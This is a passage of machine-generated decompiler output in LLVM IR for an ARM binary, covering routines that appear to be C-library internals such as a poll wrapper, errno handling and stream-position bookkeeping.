; uselistorder directives
  uselistorder i32* @global_var_1aaec.542, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1377c, { 1, 0 }
}

define i32 @function_13788() local_unnamed_addr {
dec_label_pc_13788:
  %stack_var_-8 = alloca i32, align 4
  %v3_13788 = load i32, i32* @r4, align 4
  store i32 %v3_13788, i32* %stack_var_-8, align 4
  %v0_1378c = load i32, i32* @r0, align 4
  %v0_13790 = call i32 @function_cec4()
  %v1_13794 = sub i32 0, %v0_1378c
  %v2_13798 = inttoptr i32 %v0_13790 to i32*
  store i32 %v1_13794, i32* %v2_13798, align 4
  %v2_137a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_137a0, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_137a4(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_137a4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137a4 = load i32, i32* @r4, align 4
  store i32 %v3_137a4, i32* %stack_var_-8, align 4
  %v5_137a8 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_137a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_137a8, -4095
  br i1 %tmp, label %dec_label_pc_137c8, label %dec_label_pc_137b8

dec_label_pc_137b8:                               ; preds = %dec_label_pc_137a4
  %v0_137b8 = call i32 @function_cec4()
  %v0_137bc = load i32, i32* %r4.global-to-local, align 4
  %v1_137bc = sub i32 0, %v0_137bc
  %v2_137c0 = inttoptr i32 %v0_137b8 to i32*
  store i32 %v1_137bc, i32* %v2_137c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137c8:                               ; preds = %dec_label_pc_137a4, %dec_label_pc_137b8
  %v0_137c8 = phi i32 [ %v5_137a8, %dec_label_pc_137a4 ], [ -1, %dec_label_pc_137b8 ]
  %v2_137cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_137cc, i32* @r4, align 4
  ret i32 %v0_137c8

; uselistorder directives
  uselistorder i32 %v5_137a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_137c8, { 1, 0 }
}

define i32 @function_137d0() local_unnamed_addr {
dec_label_pc_137d0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_137d0 = load i32, i32* @r2, align 4
  store i32 %v0_137d0, i32* %r3.global-to-local, align 4
  %v0_137d4 = load i32, i32* @r1, align 4
  %v3_137d4 = ashr i32 %v0_137d4, 31
  store i32 %v3_137d4, i32* %r2.global-to-local, align 4
  %v3_137dc = load i32, i32* @r4, align 4
  %v6_137dc = load i32, i32* @r5, align 4
  %v9_137dc = load i32, i32* @r6, align 4
  %v2_137e4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_137d0, i32* @r6, align 4
  %v0_137ec = load i32, i32* @r0, align 4
  store i32 %v0_137ec, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_137d0, 3
  br i1 %tmp, label %dec_label_pc_13808, label %dec_label_pc_137f4

dec_label_pc_137f4:                               ; preds = %dec_label_pc_137d0
  %v0_137f4 = call i32 @function_cec4()
  store i32 %v0_137f4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_13800 = inttoptr i32 %v0_137f4 to i32*
  store i32 22, i32* %v2_13800, align 4
  br label %.thread3

dec_label_pc_13808:                               ; preds = %dec_label_pc_137d0
  %v1_13808 = add i32 %v0_137ec, 52
  %v2_13808 = inttoptr i32 %v1_13808 to i32*
  %v3_13808 = load i32, i32* %v2_13808, align 4
  store i32 %v3_13808, i32* %r7.global-to-local, align 4
  %v2_1380c = icmp eq i32 %v3_13808, 0
  store i32 %v0_137d4, i32* %stack_var_-28, align 4
  br i1 %v2_1380c, label %dec_label_pc_1381c, label %dec_label_pc_13848

dec_label_pc_1381c:                               ; preds = %dec_label_pc_13808
  %v1_1381c = add i32 %v0_137ec, 56
  store i32 %v1_1381c, i32* @r4, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  store i32 %v2_137e4, i32* @r0, align 4
  store i32 %v1_1381c, i32* %r2.global-to-local, align 4
  %v1_13834 = call i32 @function_10d54()
  %v0_13838 = load i32, i32* @r4, align 4
  store i32 %v0_13838, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  store i32 79944, i32* @lr, align 4
  %v1_13844 = call i32 @function_10d4c()
  store i32 %v1_13844, i32* %r0.global-to-local, align 4
  %v0_13848.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13848

dec_label_pc_13848:                               ; preds = %dec_label_pc_13808, %dec_label_pc_1381c
  %v0_13854 = phi i32 [ %v0_137ec, %dec_label_pc_13808 ], [ %v0_13848.pre, %dec_label_pc_1381c ]
  %v1_13848 = inttoptr i32 %v0_13854 to i8*
  %v2_13848 = load i8, i8* %v1_13848, align 1
  %v3_13848 = zext i8 %v2_13848 to i32
  store i32 %v3_13848, i32* %r3.global-to-local, align 4
  %v1_1384c = and i32 %v3_13848, 64
  %v2_1384c = icmp eq i32 %v1_1384c, 0
  br i1 %v2_1384c, label %dec_label_pc_13864, label %dec_label_pc_13854

dec_label_pc_13854:                               ; preds = %dec_label_pc_13848
  store i32 %v0_13854, i32* @r0, align 4
  %v0_13858 = call i32 @function_d8c8()
  store i32 %v0_13858, i32* %r0.global-to-local, align 4
  %v2_1385c = icmp eq i32 %v0_13858, 0
  br i1 %v2_1385c, label %dec_label_pc_13864, label %dec_label_pc_138d4

dec_label_pc_13864:                               ; preds = %dec_label_pc_13854, %dec_label_pc_13848
  %v0_13864 = load i32, i32* @r6, align 4
  %v7_13864 = icmp eq i32 %v0_13864, 1
  br i1 %v7_13864, label %dec_label_pc_1386c, label %dec_label_pc_13864.dec_label_pc_13880_crit_edge

dec_label_pc_13864.dec_label_pc_13880_crit_edge:  ; preds = %dec_label_pc_13864
  br label %dec_label_pc_13880

dec_label_pc_1386c:                               ; preds = %dec_label_pc_13864
  %v0_1386c = load i32, i32* @r5, align 4
  store i32 %v0_1386c, i32* %r0.global-to-local, align 4
  %v2_13870 = ptrtoint i32* %stack_var_-28 to i32
  %v2_13874 = inttoptr i32 %v0_1386c to i8*
  %v3_13874 = call i32 @function_13968(i8* %v2_13874, i32 %v2_13870)
  store i32 %v3_13874, i32* %r0.global-to-local, align 4
  %v1_13878 = icmp slt i32 %v3_13874, 0
  br i1 %v1_13878, label %dec_label_pc_138d4, label %dec_label_pc_1386c.dec_label_pc_13880_crit_edge

dec_label_pc_1386c.dec_label_pc_13880_crit_edge:  ; preds = %dec_label_pc_1386c
  %v0_13880.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13880

dec_label_pc_13880:                               ; preds = %dec_label_pc_13864.dec_label_pc_13880_crit_edge, %dec_label_pc_1386c.dec_label_pc_13880_crit_edge
  %v0_13880 = phi i32 [ %v0_13864, %dec_label_pc_13864.dec_label_pc_13880_crit_edge ], [ %v0_13880.pre, %dec_label_pc_1386c.dec_label_pc_13880_crit_edge ]
  store i32 %v0_13880, i32* %r2.global-to-local, align 4
  %v0_13884 = load i32, i32* @r5, align 4
  store i32 %v0_13884, i32* %r0.global-to-local, align 4
  %v4_1388c = call i32 @function_13b1c(i32 %v0_13884, i32* nonnull %stack_var_-28, i32 %v0_13880)
  store i32 %v4_1388c, i32* %r0.global-to-local, align 4
  %v1_13890 = icmp slt i32 %v4_1388c, 0
  br i1 %v1_13890, label %dec_label_pc_138d4, label %dec_label_pc_13898

dec_label_pc_13898:                               ; preds = %dec_label_pc_13880
  %v0_13898 = load i32, i32* @r5, align 4
  %v1_13898 = inttoptr i32 %v0_13898 to i32*
  %v2_13898 = load i32, i32* %v1_13898, align 4
  store i32 %v2_13898, i32* %r3.global-to-local, align 4
  %v1_1389c = add i32 %v0_13898, 8
  %v2_1389c = inttoptr i32 %v1_1389c to i32*
  %v3_1389c = load i32, i32* %v2_1389c, align 4
  store i32 %v3_1389c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_138a4 = and i32 %v2_13898, -72
  store i32 %v1_138a4, i32* %r3.global-to-local, align 4
  %v3_138a8 = sdiv i32 %v2_13898, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_138b0 = trunc i32 %v3_138a8 to i8
  %v3_138b0 = add i32 %v0_13898, 1
  %v4_138b0 = inttoptr i32 %v3_138b0 to i8*
  store i8 %v1_138b0, i8* %v4_138b0, align 1
  %v0_138b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_138b4 = load i32, i32* @r5, align 4
  %v2_138b4 = add i32 %v1_138b4, 28
  %v3_138b4 = inttoptr i32 %v2_138b4 to i32*
  store i32 %v0_138b4, i32* %v3_138b4, align 4
  %v0_138b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_138b8 = trunc i32 %v0_138b8 to i8
  %v2_138b8 = load i32, i32* @r5, align 4
  %v3_138b8 = add i32 %v2_138b8, 2
  %v4_138b8 = inttoptr i32 %v3_138b8 to i8*
  store i8 %v1_138b8, i8* %v4_138b8, align 1
  %v0_138bc = load i32, i32* %r3.global-to-local, align 4
  %v1_138bc = trunc i32 %v0_138bc to i8
  %v2_138bc = load i32, i32* @r5, align 4
  %v3_138bc = inttoptr i32 %v2_138bc to i8*
  store i8 %v1_138bc, i8* %v3_138bc, align 1
  %v0_138c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_138c0 = load i32, i32* @r5, align 4
  %v2_138c0 = add i32 %v1_138c0, 16
  %v3_138c0 = inttoptr i32 %v2_138c0 to i32*
  store i32 %v0_138c0, i32* %v3_138c0, align 4
  %v0_138c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_138c4 = load i32, i32* @r5, align 4
  %v2_138c4 = add i32 %v1_138c4, 20
  %v3_138c4 = inttoptr i32 %v2_138c4 to i32*
  store i32 %v0_138c4, i32* %v3_138c4, align 4
  %v0_138c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_138c8 = load i32, i32* @r5, align 4
  %v2_138c8 = add i32 %v1_138c8, 24
  %v3_138c8 = inttoptr i32 %v2_138c8 to i32*
  store i32 %v0_138c8, i32* %v3_138c8, align 4
  %v0_138cc = load i32, i32* %r0.global-to-local, align 4
  %v1_138cc = load i32, i32* @r5, align 4
  %v2_138cc = add i32 %v1_138cc, 44
  %v3_138cc = inttoptr i32 %v2_138cc to i32*
  store i32 %v0_138cc, i32* %v3_138cc, align 4
  br label %dec_label_pc_138d8

dec_label_pc_138d4:                               ; preds = %dec_label_pc_13854, %dec_label_pc_13880, %dec_label_pc_1386c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_138d8

dec_label_pc_138d8:                               ; preds = %dec_label_pc_13898, %dec_label_pc_138d4
  %v0_138d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_138d8 = icmp eq i32 %v0_138d8, 0
  br i1 %v2_138d8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_138d8
  store i32 %v2_137e4, i32* %r0.global-to-local, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  store i32 80112, i32* @lr, align 4
  call void @__pseudo_branch(i32 68948)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_138d8, %dec_label_pc_137f4, %bb
  %v0_138f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_138f0, i32* %r0.global-to-local, align 4
  store i32 %v3_137dc, i32* @r4, align 4
  store i32 %v6_137dc, i32* @r5, align 4
  store i32 %v9_137dc, i32* @r6, align 4
  ret i32 %v0_138f0

; uselistorder directives
  uselistorder i32 %v0_13880, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 7, 2, 8, 1, 9, 11, 0, 10, 12 }
  uselistorder i32 ()* @function_10d4c, { 29, 38, 37, 36, 35, 34, 33, 27, 4, 39, 5, 3, 2, 1, 47, 46, 45, 28, 26, 0, 25, 24, 23, 22, 21, 20, 19, 18, 17, 31, 16, 15, 14, 13, 12, 44, 30, 11, 43, 32, 10, 9, 42, 41, 40, 8, 7, 6 }
  uselistorder i32 ptrtoint (i8* @global_var_10d4c.283 to i32), { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10d54, { 26, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 25, 24, 0, 1, 44, 43, 3, 2, 30, 29, 23, 22, 21, 20, 19, 18, 17, 16, 15, 52, 28, 27, 14, 51, 13, 12, 11, 10, 50, 49, 48, 47, 46, 45, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 68948, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12, 13, 14, 15 }
  uselistorder i32 52, { 7, 3, 5, 8, 4, 2, 9, 10, 1, 0, 6 }
  uselistorder i32 22, { 1, 11, 2, 3, 8, 10, 12, 4, 13, 0, 14, 5, 9, 6, 7 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_138d8, { 1, 0 }
  uselistorder label %dec_label_pc_138d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13880, { 1, 0 }
  uselistorder label %dec_label_pc_13848, { 1, 0 }
}

define i32 @function_1390c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1390c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1390c = load i32, i32* @r4, align 4
  store i32 %v3_1390c, i32* %stack_var_-12, align 4
  %v3_13910 = load i8, i8* %arg1, align 1
  %v4_13910 = zext i8 %v3_13910 to i32
  store i32 %v4_13910, i32* %r3.global-to-local, align 4
  %v1_13914 = and i32 %v4_13910, 4
  store i32 %v1_13914, i32* %r5.global-to-local, align 4
  %v2_13914 = icmp eq i32 %v1_13914, 0
  store i1 %v2_13914, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_13914, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1390c
  store i32 %v3_1390c, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %dec_label_pc_1390c
  %v1_13924 = icmp slt i32 %arg2, 0
  %v2_13924 = icmp eq i32 %arg2, 0
  store i1 %v2_13924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13924, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_1392c = add i32 %tmp, 4
  %v2_1392c = inttoptr i32 %v1_1392c to i32*
  %v3_1392c = load i32, i32* %v2_1392c, align 4
  store i32 %v3_1392c, i32* %r0.global-to-local, align 4
  %v1_13930 = call i32 @function_14a68(i32 %v3_1392c)
  store i32 %v1_13930, i32* %r0.global-to-local, align 4
  %v2_13934 = icmp eq i32 %v1_13930, 0
  store i1 %v2_13934, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_13930, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_13938 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_13938, i32* @r4, align 4
  ret i32 %v1_13930

bb13:                                             ; preds = %bb10
  %v0_1393c = load i32, i32* @r4, align 4
  %v1_1393c = inttoptr i32 %v0_1393c to i32*
  %v2_1393c = load i32, i32* %v1_1393c, align 4
  %v1_13940 = or i32 %v2_1393c, 8
  store i32 %v1_13940, i32* %r1.global-to-local, align 4
  %v1_13944 = or i32 %v2_1393c, 4
  store i32 %v1_13944, i32* %r3.global-to-local, align 4
  %v3_13948 = sdiv i32 %v2_1393c, 256
  store i32 %v3_13948, i32* %ip.global-to-local, align 4
  br i1 %v2_13934, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_13950 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_13950, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_13954 = trunc i32 %v3_13948 to i8
  %v4_13954 = add i32 %v0_1393c, 1
  %v5_13954 = inttoptr i32 %v4_13954 to i8*
  store i8 %v2_13954, i8* %v5_13954, align 1
  %v0_13958.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13958.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_13958 = load i32, i32* %r3.global-to-local, align 4
  %v2_13958 = trunc i32 %v1_13958 to i8
  %v3_13958 = load i32, i32* @r4, align 4
  %v4_13958 = inttoptr i32 %v3_13958 to i8*
  store i8 %v2_13958, i8* %v4_13958, align 1
  %v0_1395c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1395c.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_1395c = load i32, i32* %ip.global-to-local, align 4
  %v2_1395c = trunc i32 %v1_1395c to i8
  %v3_1395c = load i32, i32* @r4, align 4
  %v4_1395c = add i32 %v3_1395c, 1
  %v5_1395c = inttoptr i32 %v4_1395c to i8*
  store i8 %v2_1395c, i8* %v5_1395c, align 1
  %v0_13960.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13960.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_13960 = load i32, i32* %r1.global-to-local, align 4
  %v2_13960 = trunc i32 %v1_13960 to i8
  %v3_13960 = load i32, i32* @r4, align 4
  %v4_13960 = inttoptr i32 %v3_13960 to i8*
  store i8 %v2_13960, i8* %v4_13960, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_13964 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13964, i32* @r4, align 4
  %v11_13964 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_13964

; uselistorder directives
  uselistorder i32 %v3_13948, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_13968(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13968:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13968 = load i32, i32* @r4, align 4
  store i32 %v3_13968, i32* %stack_var_-16, align 4
  %v2_1396c = add i32 %tmp, 1
  %v3_1396c = inttoptr i32 %v2_1396c to i8*
  %v4_1396c = load i8, i8* %v3_1396c, align 1
  %v5_1396c = zext i8 %v4_1396c to i32
  %v3_13970 = load i8, i8* %arg1, align 1
  %v4_13970 = zext i8 %v3_13970 to i32
  store i32 %v4_13970, i32* %r2.global-to-local, align 4
  %v4_13974 = mul nuw nsw i32 %v5_1396c, 256
  %v5_13974 = or i32 %v4_13970, %v4_13974
  store i32 %v5_13974, i32* @lr, align 4
  %tmp15 = urem i8 %v3_13970, 4
  %v2_13978 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_13978, label %bb, label %dec_label_pc_13988

bb:                                               ; preds = %dec_label_pc_13968
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_13988:                               ; preds = %dec_label_pc_13968
  %v1_13978 = zext i8 %tmp15 to i32
  %v1_13988 = add nsw i32 %v1_13978, -1
  store i32 %v1_13988, i32* @ip, align 4
  %v7_13988 = icmp eq i8 %tmp15, 1
  br i1 %v7_13988, label %.thread, label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %dec_label_pc_13988
  %v1_13990 = and i32 %v4_13974, 2048
  %v2_13990 = icmp eq i32 %v1_13990, 0
  br i1 %v2_13990, label %.thread, label %dec_label_pc_13998

dec_label_pc_13998:                               ; preds = %dec_label_pc_13990
  %v8_1399c = icmp sgt i32 %v1_13988, 1
  br i1 %v8_1399c, label %dec_label_pc_13a28, label %dec_label_pc_139a0

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13998
  %v2_139a0 = add i32 %tmp, 40
  %v3_139a0 = inttoptr i32 %v2_139a0 to i32*
  %v4_139a0 = load i32, i32* %v3_139a0, align 4
  %v2_139a4 = icmp eq i32 %v4_139a0, 0
  br i1 %v2_139a4, label %dec_label_pc_139ac, label %dec_label_pc_13a28

dec_label_pc_139ac:                               ; preds = %dec_label_pc_139a0
  %v2_139ac = add i32 %tmp, 3
  %v3_139ac = inttoptr i32 %v2_139ac to i8*
  %v4_139ac = load i8, i8* %v3_139ac, align 1
  %v5_139ac = zext i8 %v4_139ac to i32
  %v2_139b0 = add i32 %tmp, 44
  %v3_139b0 = inttoptr i32 %v2_139b0 to i32*
  %v4_139b0 = load i32, i32* %v3_139b0, align 4
  store i32 %v4_139b0, i32* %r2.global-to-local, align 4
  %v2_139b4 = sub nsw i32 %v1_13988, %v5_139ac
  %v1_139bc = add nsw i32 %v2_139b4, -1
  store i32 %v1_139bc, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_139b0, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_139ac
  %v7_139c0 = add i32 %tmp, 2
  %v8_139c0 = inttoptr i32 %v7_139c0 to i8*
  %v9_139c0 = load i8, i8* %v8_139c0, align 1
  %v10_139c0 = zext i8 %v9_139c0 to i32
  %v7_139c4 = sub nsw i32 %v1_139bc, %v10_139c0
  store i32 %v7_139c4, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_139ac, %bb, %dec_label_pc_13990, %dec_label_pc_13988, %bb12
  %v0_139e0 = phi i32 [ %v1_13988, %dec_label_pc_13990 ], [ %v1_13988, %dec_label_pc_13988 ], [ 0, %bb ], [ %v7_139c4, %bb12 ], [ %v1_139bc, %dec_label_pc_139ac ]
  %v1_139c8 = and i32 %v4_13970, 64
  %v2_139c8 = icmp eq i32 %v1_139c8, 0
  %storemerge.in.in.v = select i1 %v2_139c8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_139d4 = add i32 %tmp, 16
  %v3_139d4 = inttoptr i32 %v2_139d4 to i32*
  %v4_139d4 = load i32, i32* %v3_139d4, align 4
  %v2_139d8 = sub i32 %storemerge, %v4_139d4
  %v1_139dc = inttoptr i32 %arg2 to i32*
  %v2_139dc = load i32, i32* %v1_139dc, align 4
  store i32 %v2_139dc, i32* %r1.global-to-local, align 4
  %v3_139dc = add i32 %arg2, 4
  %v4_139dc = inttoptr i32 %v3_139dc to i32*
  %v5_139dc = load i32, i32* %v4_139dc, align 4
  store i32 %v5_139dc, i32* %r2.global-to-local, align 4
  %v2_139e0 = add i32 %v2_139d8, %v0_139e0
  store i32 %v2_139e0, i32* %r5.global-to-local, align 4
  %v2_139e4 = sub i32 %v2_139dc, %v2_139e0
  %v2_139e8 = and i32 %v2_139e0, 1073741824
  %v3_139e8 = icmp ne i32 %v2_139e8, 0
  %v6_139e8 = icmp eq i1 %v3_139e8, false
  %tmp16 = icmp slt i32 %v2_139e0, 0
  %v4_139e8.neg = zext i1 %tmp16 to i32
  %v7_139e8 = add i32 %v5_139dc, %v4_139e8.neg
  %v9_139e8 = sext i1 %v6_139e8 to i32
  %v10_139e8 = add i32 %v7_139e8, %v9_139e8
  store i32 %v10_139e8, i32* %r4.global-to-local, align 4
  store i32 %v2_139e4, i32* %v1_139dc, align 4
  %v5_139ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_139ec, i32* %v4_139dc, align 4
  %v0_139f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_139f0 = add i32 %v0_139f0, 4
  %v2_139f0 = inttoptr i32 %v1_139f0 to i32*
  %v3_139f0 = load i32, i32* %v2_139f0, align 4
  %v1_139f4 = load i32, i32* %r2.global-to-local, align 4
  %v8_139f8 = icmp sgt i32 %v3_139f0, %v1_139f4
  br i1 %v8_139f8, label %dec_label_pc_13a0c, label %dec_label_pc_139fc

dec_label_pc_139fc:                               ; preds = %.thread
  %v9_139f4 = icmp eq i32 %v3_139f0, %v1_139f4
  br i1 %v9_139f4, label %dec_label_pc_13a00, label %dec_label_pc_13a10thread-pre-split

dec_label_pc_13a00:                               ; preds = %dec_label_pc_139fc
  %v1_13a00 = inttoptr i32 %v0_139f0 to i32*
  %v2_13a00 = load i32, i32* %v1_13a00, align 4
  %v1_13a04 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_13a00, %v1_13a04
  br i1 %tmp17, label %dec_label_pc_13a0c, label %dec_label_pc_13a10thread-pre-split

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_13a00, %.thread
  %v0_13a0c = load i32, i32* %r5.global-to-local, align 4
  %v1_13a0c = sub i32 0, %v0_13a0c
  store i32 %v1_13a0c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a10

dec_label_pc_13a10thread-pre-split:               ; preds = %dec_label_pc_13a00, %dec_label_pc_139fc
  %v0_13a10.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a10

dec_label_pc_13a10:                               ; preds = %dec_label_pc_13a10thread-pre-split, %dec_label_pc_13a0c
  %v0_13a10 = phi i32 [ %v0_13a10.pr, %dec_label_pc_13a10thread-pre-split ], [ %v1_13a0c, %dec_label_pc_13a0c ]
  %v1_13a10 = icmp slt i32 %v0_13a10, 0
  br i1 %v1_13a10, label %dec_label_pc_13a18, label %dec_label_pc_13a2c

dec_label_pc_13a18:                               ; preds = %dec_label_pc_13a10
  %v0_13a18 = call i32 @function_cec4()
  %v2_13a20 = inttoptr i32 %v0_13a18 to i32*
  store i32 75, i32* %v2_13a20, align 4
  %v0_13a2c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a2c

dec_label_pc_13a28:                               ; preds = %dec_label_pc_139a0, %dec_label_pc_13998
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a2c

dec_label_pc_13a2c:                               ; preds = %dec_label_pc_13a10, %dec_label_pc_13a18, %dec_label_pc_13a28
  %v0_13a2c = phi i32 [ %v0_13a10, %dec_label_pc_13a10 ], [ %v0_13a2c.pre, %dec_label_pc_13a18 ], [ -1, %dec_label_pc_13a28 ]
  %v2_13a30 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13a30, i32* @r4, align 4
  ret i32 %v0_13a2c

; uselistorder directives
  uselistorder i32 %v1_139f4, { 1, 0 }
  uselistorder i32 %v3_139f0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_13970, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13a2c, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @function_13a34(i32 %arg1) local_unnamed_addr {
dec_label_pc_13a34:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13a34 = load i32, i32* @r4, align 4
  store i32 %v3_13a34, i32* %stack_var_-8, align 4
  %v1_13a38 = add i32 %arg1, 8
  %v1_13a3c = inttoptr i32 %v1_13a38 to i32*
  %v2_13a3c = load i32, i32* %v1_13a3c, align 4
  store i32 %v2_13a3c, i32* @r1, align 4
  %v3_13a3c = add i32 %arg1, 12
  %v4_13a3c = inttoptr i32 %v3_13a3c to i32*
  %v5_13a3c = load i32, i32* %v4_13a3c, align 4
  %v2_13a40 = sub i32 %v5_13a3c, %v2_13a3c
  store i32 %v2_13a40, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_13a48 = inttoptr i32 %arg1 to i8*
  %v4_13a48 = call i32 @function_1390c(i8* %v3_13a48, i32 %v2_13a3c, i32 %v2_13a40)
  %v0_13a4c = load i32, i32* @r4, align 4
